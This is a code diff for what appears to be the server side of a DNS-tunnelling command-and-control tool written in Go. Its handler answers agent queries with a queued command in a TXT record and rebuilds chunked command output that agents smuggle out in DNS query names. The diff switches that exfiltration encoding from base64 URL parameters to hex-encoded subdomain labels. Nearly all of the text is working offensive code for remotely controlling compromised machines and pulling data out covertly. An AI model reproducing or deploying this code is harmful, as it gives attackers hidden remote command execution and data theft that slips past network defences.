@@ -2,9 +2,8 @@ package cmd
 
 import (
 	"bufio"
-	"encoding/base64"
+	"encoding/hex"
 	"fmt"
-	"net/url"
 	"os"
 	"strings"
 
@@ -51,17 +50,14 @@ func Run() {
 				break
 			}
 		}
+
 		fmt.Println(outputBuffer)
 	}
 }
 
 func AgentHandler(w dns.ResponseWriter, req *dns.Msg) {
-	urlConstr := "https://" + req.Question[0].Name[:len(req.Question[0].Name)-1]
-	malMess, err := url.Parse(urlConstr)
-	if err != nil {
-		fmt.Println("URL Parsing Error")
-	}
-	message := malMess.Query()
+	urlConstr := req.Question[0].Name
+	deconUrl := strings.Split(urlConstr, ".")
 
 	dnsMessage := new(dns.Msg)
 	dnsMessage.SetReply(req)
@@ -77,17 +73,15 @@ func AgentHandler(w dns.ResponseWriter, req *dns.Msg) {
 		Txt: []string{cmd},
 	})
 
-	if messageValue, ok := message["o"]; ok {
-		chunkLen := message["cs"][0]
-		currentChunk := message["cc"][0]
-
-		joinBuffer = append(joinBuffer, messageValue[0])
-		if currentChunk == chunkLen {
+	if deconUrl[0] != "0" {
+		currentCunk := strings.Split(deconUrl[0], "-")[0]
+		chunkLen := strings.Split(deconUrl[0], "-")[1]
+		joinBuffer = append(joinBuffer, string(deconUrl[2]))
+		if currentCunk == chunkLen {
 			joinResult := strings.Join(joinBuffer, "")
-			sDec, _ := base64.StdEncoding.DecodeString(joinResult)
-			outputBuffer = string(sDec)
+			decodedOut, _ := hex.DecodeString(joinResult)
+			outputBuffer = string(decodedOut)
 			resetState()
 		}
-
 	}
 }
